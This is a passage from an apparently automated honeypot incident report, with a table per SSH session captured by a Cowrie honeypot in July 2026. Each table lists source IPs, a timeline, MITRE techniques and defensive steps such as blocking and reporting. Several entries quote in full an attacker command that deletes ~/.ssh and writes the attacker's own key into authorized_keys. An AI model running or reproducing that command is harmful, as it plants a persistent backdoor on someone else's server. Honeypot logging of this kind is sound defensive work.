| `2026-07-02 03:52:15` | `cowrie.client.kex` |
| `2026-07-02 03:52:15` | `cowrie.login.success` |
| `2026-07-02 03:52:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.242.11[.]232` to AbuseIPDB if not already reported
- [ ] Block `47.242.11[.]232` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3ef8baea5f8

| Field | Detail |
|---|---|
| **Source IP** | `47.242.11[.]232` |
| **First Seen** | 2026-07-02 03:52 |
| **Last Seen** | 2026-07-02 03:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 03:52:16` | `cowrie.session.connect` |
| `2026-07-02 03:52:16` | `cowrie.client.version` |
| `2026-07-02 03:52:16` | `cowrie.client.kex` |
| `2026-07-02 03:52:17` | `cowrie.login.success` |
| `2026-07-02 03:52:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.242.11[.]232` to AbuseIPDB if not already reported
- [ ] Block `47.242.11[.]232` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8479446bc2b1

| Field | Detail |
|---|---|
| **Source IP** | `124.225.4[.]88` |
| **First Seen** | 2026-07-02 03:52 |
| **Last Seen** | 2026-07-02 03:53 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 03:52:59` | `cowrie.session.connect` |
| `2026-07-02 03:53:00` | `cowrie.client.version` |
| `2026-07-02 03:53:00` | `cowrie.client.kex` |
| `2026-07-02 03:53:01` | `cowrie.login.success` |
| `2026-07-02 03:53:02` | `cowrie.session.params` |
| `2026-07-02 03:53:02` | `cowrie.command.input` |
| `2026-07-02 03:53:02` | `cowrie.log.closed` |
| `2026-07-02 03:53:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.225.4[.]88` to AbuseIPDB if not already reported
- [ ] Block `124.225.4[.]88` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a480d4e2a367

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-02 03:54 |
| **Last Seen** | 2026-07-02 03:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo $HOME` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 03:54:23` | `cowrie.session.connect` |
| `2026-07-02 03:54:23` | `cowrie.client.version` |
| `2026-07-02 03:54:23` | `cowrie.client.kex` |
| `2026-07-02 03:54:23` | `cowrie.login.success` |
| `2026-07-02 03:54:25` | `cowrie.session.params` |
| `2026-07-02 03:54:25` | `cowrie.command.input` |
| `2026-07-02 03:54:25` | `cowrie.log.closed` |
| `2026-07-02 03:54:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ab9b090cb5e

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 03:54 |
| **Last Seen** | 2026-07-02 03:55 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 03:54:51` | `cowrie.session.connect` |
| `2026-07-02 03:54:53` | `cowrie.client.version` |
| `2026-07-02 03:54:53` | `cowrie.client.kex` |
| `2026-07-02 03:54:59` | `cowrie.login.success` |
| `2026-07-02 03:55:04` | `cowrie.session.params` |
| `2026-07-02 03:55:04` | `cowrie.command.input` |
| `2026-07-02 03:55:05` | `cowrie.log.closed` |
| `2026-07-02 03:55:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c61365ec768c

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-02 03:59 |
| **Last Seen** | 2026-07-02 03:59 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo $HOME` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 03:59:31` | `cowrie.session.connect` |
| `2026-07-02 03:59:31` | `cowrie.client.version` |
| `2026-07-02 03:59:31` | `cowrie.client.kex` |
| `2026-07-02 03:59:32` | `cowrie.login.success` |
| `2026-07-02 03:59:33` | `cowrie.session.params` |
| `2026-07-02 03:59:33` | `cowrie.command.input` |
| `2026-07-02 03:59:34` | `cowrie.log.closed` |
| `2026-07-02 03:59:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b60bb8dd006

| Field | Detail |
|---|---|
| **Source IP** | `14.103.127[.]232` |
| **First Seen** | 2026-07-02 04:01 |
| **Last Seen** | 2026-07-02 04:01 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 04:01:11` | `cowrie.session.connect` |
| `2026-07-02 04:01:11` | `cowrie.client.version` |
| `2026-07-02 04:01:11` | `cowrie.client.kex` |
| `2026-07-02 04:01:18` | `cowrie.login.success` |
| `2026-07-02 04:01:19` | `cowrie.session.params` |
| `2026-07-02 04:01:19` | `cowrie.command.input` |
| `2026-07-02 04:01:19` | `cowrie.command.failed` |
| `2026-07-02 04:01:20` | `cowrie.log.closed` |
| `2026-07-02 04:01:20` | `cowrie.session.params` |
| `2026-07-02 04:01:20` | `cowrie.command.input` |
| `2026-07-02 04:01:21` | `cowrie.session.file_download` |
| `2026-07-02 04:01:21` | `cowrie.log.closed` |
| `2026-07-02 04:01:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.127[.]232` to AbuseIPDB if not already reported
- [ ] Block `14.103.127[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2af1bfb1e2be

| Field | Detail |
|---|---|
| **Source IP** | `14.103.127[.]232` |
| **First Seen** | 2026-07-02 04:01 |
| **Last Seen** | 2026-07-02 04:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 04:01:21` | `cowrie.session.connect` |
| `2026-07-02 04:01:21` | `cowrie.client.version` |
| `2026-07-02 04:01:21` | `cowrie.client.kex` |
| `2026-07-02 04:01:22` | `cowrie.login.success` |
| `2026-07-02 04:01:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.127[.]232` to AbuseIPDB if not already reported
- [ ] Block `14.103.127[.]232` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4784bac16e68

| Field | Detail |
|---|---|
| **Source IP** | `14.103.127[.]232` |
| **First Seen** | 2026-07-02 04:01 |
| **Last Seen** | 2026-07-02 04:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 04:01:22` | `cowrie.session.connect` |
| `2026-07-02 04:01:22` | `cowrie.client.version` |
| `2026-07-02 04:01:22` | `cowrie.client.kex` |
| `2026-07-02 04:01:23` | `cowrie.login.success` |
| `2026-07-02 04:01:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.127[.]232` to AbuseIPDB if not already reported
- [ ] Block `14.103.127[.]232` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65542235f591

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-02 04:03 |
| **Last Seen** | 2026-07-02 04:03 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 04:03:25` | `cowrie.session.connect` |
| `2026-07-02 04:03:25` | `cowrie.client.version` |
| `2026-07-02 04:03:25` | `cowrie.client.kex` |
| `2026-07-02 04:03:26` | `cowrie.login.success` |
| `2026-07-02 04:03:27` | `cowrie.session.params` |
| `2026-07-02 04:03:27` | `cowrie.command.input` |
| `2026-07-02 04:03:28` | `cowrie.log.closed` |
| `2026-07-02 04:03:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95495b82aa98

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-02 04:05 |
| **Last Seen** | 2026-07-02 04:05 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo $HOME` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 04:05:05` | `cowrie.session.connect` |
| `2026-07-02 04:05:05` | `cowrie.client.version` |
| `2026-07-02 04:05:05` | `cowrie.client.kex` |
| `2026-07-02 04:05:06` | `cowrie.login.success` |
| `2026-07-02 04:05:07` | `cowrie.session.params` |
| `2026-07-02 04:05:07` | `cowrie.command.input` |
| `2026-07-02 04:05:07` | `cowrie.log.closed` |
| `2026-07-02 04:05:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4c8f972c3e1

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 04:06 |
| **Last Seen** | 2026-07-02 04:06 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 04:06:29` | `cowrie.session.connect` |
| `2026-07-02 04:06:31` | `cowrie.client.version` |
| `2026-07-02 04:06:31` | `cowrie.client.kex` |
| `2026-07-02 04:06:38` | `cowrie.login.success` |
| `2026-07-02 04:06:42` | `cowrie.session.params` |
| `2026-07-02 04:06:42` | `cowrie.command.input` |
| `2026-07-02 04:06:43` | `cowrie.log.closed` |
| `2026-07-02 04:06:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60cb7cbb0880

| Field | Detail |
|---|---|
| **Source IP** | `8.146.225[.]57` |
| **First Seen** | 2026-07-02 04:10 |
| **Last Seen** | 2026-07-02 04:10 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 04:10:11` | `cowrie.session.connect` |
| `2026-07-02 04:10:11` | `cowrie.client.version` |
| `2026-07-02 04:10:12` | `cowrie.client.kex` |
| `2026-07-02 04:10:13` | `cowrie.login.success` |
| `2026-07-02 04:10:14` | `cowrie.session.params` |
| `2026-07-02 04:10:14` | `cowrie.command.input` |
| `2026-07-02 04:10:14` | `cowrie.command.failed` |
| `2026-07-02 04:10:14` | `cowrie.log.closed` |
| `2026-07-02 04:10:15` | `cowrie.session.params` |
| `2026-07-02 04:10:15` | `cowrie.command.input` |
| `2026-07-02 04:10:15` | `cowrie.session.file_download` |
| `2026-07-02 04:10:15` | `cowrie.log.closed` |
| `2026-07-02 04:10:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.146.225[.]57` to AbuseIPDB if not already reported
- [ ] Block `8.146.225[.]57` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0394a3fcafcb

| Field | Detail |
|---|---|
| **Source IP** | `8.146.225[.]57` |
| **First Seen** | 2026-07-02 04:10 |
| **Last Seen** | 2026-07-02 04:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 04:10:16` | `cowrie.session.connect` |
| `2026-07-02 04:10:16` | `cowrie.client.version` |
| `2026-07-02 04:10:16` | `cowrie.client.kex` |
| `2026-07-02 04:10:17` | `cowrie.login.success` |
| `2026-07-02 04:10:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.146.225[.]57` to AbuseIPDB if not already reported
- [ ] Block `8.146.225[.]57` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b71872609848

| Field | Detail |
|---|---|
| **Source IP** | `8.146.225[.]57` |
| **First Seen** | 2026-07-02 04:10 |
| **Last Seen** | 2026-07-02 04:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 04:10:17` | `cowrie.session.connect` |
| `2026-07-02 04:10:17` | `cowrie.client.version` |
| `2026-07-02 04:10:18` | `cowrie.client.kex` |
| `2026-07-02 04:10:19` | `cowrie.login.success` |
| `2026-07-02 04:10:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.146.225[.]57` to AbuseIPDB if not already reported
- [ ] Block `8.146.225[.]57` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8cff0a591141

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-02 04:10 |
| **Last Seen** | 2026-07-02 04:10 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo $HOME` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 04:10:31` | `cowrie.session.connect` |
| `2026-07-02 04:10:31` | `cowrie.client.version` |
| `2026-07-02 04:10:31` | `cowrie.client.kex` |
| `2026-07-02 04:10:31` | `cowrie.login.success` |
| `2026-07-02 04:10:32` | `cowrie.session.params` |
| `2026-07-02 04:10:32` | `cowrie.command.input` |
| `2026-07-02 04:10:33` | `cowrie.log.closed` |
| `2026-07-02 04:10:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc004daecd02

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-02 04:11 |
| **Last Seen** | 2026-07-02 04:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 04:11:21` | `cowrie.session.connect` |
| `2026-07-02 04:11:21` | `cowrie.client.version` |
| `2026-07-02 04:11:21` | `cowrie.client.kex` |
| `2026-07-02 04:11:22` | `cowrie.login.success` |
| `2026-07-02 04:11:22` | `cowrie.session.params` |
| `2026-07-02 04:11:22` | `cowrie.command.input` |
| `2026-07-02 04:11:22` | `cowrie.log.closed` |
| `2026-07-02 04:11:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8864103a25e5

| Field | Detail |
|---|---|
| **Source IP** | `192.169.213[.]186` |
| **First Seen** | 2026-07-02 04:15 |
| **Last Seen** | 2026-07-02 04:15 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 04:15:32` | `cowrie.session.connect` |
| `2026-07-02 04:15:32` | `cowrie.client.version` |
| `2026-07-02 04:15:32` | `cowrie.client.kex` |
| `2026-07-02 04:15:32` | `cowrie.login.success` |
| `2026-07-02 04:15:33` | `cowrie.session.params` |
| `2026-07-02 04:15:33` | `cowrie.command.input` |
| `2026-07-02 04:15:33` | `cowrie.command.failed` |
| `2026-07-02 04:15:33` | `cowrie.log.closed` |
| `2026-07-02 04:15:34` | `cowrie.session.params` |
| `2026-07-02 04:15:34` | `cowrie.command.input` |
| `2026-07-02 04:15:34` | `cowrie.session.file_download` |
| `2026-07-02 04:15:34` | `cowrie.log.closed` |
| `2026-07-02 04:15:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `192.169.213[.]186` to AbuseIPDB if not already reported
- [ ] Block `192.169.213[.]186` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47936d7ab54e

| Field | Detail |
|---|---|
| **Source IP** | `192.169.213[.]186` |
| **First Seen** | 2026-07-02 04:15 |
| **Last Seen** | 2026-07-02 04:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 04:15:34` | `cowrie.session.connect` |
| `2026-07-02 04:15:34` | `cowrie.client.version` |
| `2026-07-02 04:15:34` | `cowrie.client.kex` |
| `2026-07-02 04:15:35` | `cowrie.login.success` |
| `2026-07-02 04:15:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `192.169.213[.]186` to AbuseIPDB if not already reported
- [ ] Block `192.169.213[.]186` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-020a675dbb48

| Field | Detail |
|---|---|
| **Source IP** | `192.169.213[.]186` |
| **First Seen** | 2026-07-02 04:15 |
| **Last Seen** | 2026-07-02 04:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 04:15:35` | `cowrie.session.connect` |
| `2026-07-02 04:15:35` | `cowrie.client.version` |
| `2026-07-02 04:15:35` | `cowrie.client.kex` |
| `2026-07-02 04:15:35` | `cowrie.login.success` |
| `2026-07-02 04:15:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `192.169.213[.]186` to AbuseIPDB if not already reported
- [ ] Block `192.169.213[.]186` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44eb273116ce

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-02 04:15 |
| **Last Seen** | 2026-07-02 04:15 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo $HOME` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 04:15:44` | `cowrie.session.connect` |
| `2026-07-02 04:15:44` | `cowrie.client.version` |
| `2026-07-02 04:15:44` | `cowrie.client.kex` |
| `2026-07-02 04:15:44` | `cowrie.login.success` |
| `2026-07-02 04:15:46` | `cowrie.session.params` |
| `2026-07-02 04:15:46` | `cowrie.command.input` |
| `2026-07-02 04:15:46` | `cowrie.log.closed` |
| `2026-07-02 04:15:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c639ea4f757

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-02 04:17 |
| **Last Seen** | 2026-07-02 04:17 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 04:17:15` | `cowrie.session.connect` |
| `2026-07-02 04:17:15` | `cowrie.client.version` |
| `2026-07-02 04:17:15` | `cowrie.client.kex` |
| `2026-07-02 04:17:17` | `cowrie.login.success` |
| `2026-07-02 04:17:18` | `cowrie.session.params` |
| `2026-07-02 04:17:18` | `cowrie.command.input` |
| `2026-07-02 04:17:18` | `cowrie.log.closed` |
| `2026-07-02 04:17:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b6e0ea2e658

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 04:18 |
| **Last Seen** | 2026-07-02 04:18 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 04:18:21` | `cowrie.session.connect` |
| `2026-07-02 04:18:22` | `cowrie.client.version` |
| `2026-07-02 04:18:22` | `cowrie.client.kex` |
| `2026-07-02 04:18:29` | `cowrie.login.success` |
| `2026-07-02 04:18:34` | `cowrie.session.params` |
| `2026-07-02 04:18:34` | `cowrie.command.input` |
| `2026-07-02 04:18:35` | `cowrie.log.closed` |
| `2026-07-02 04:18:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ba961af48a3

| Field | Detail |
|---|---|
| **Source IP** | `197.199.224[.]52` |
| **First Seen** | 2026-07-02 04:20 |
| **Last Seen** | 2026-07-02 04:20 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
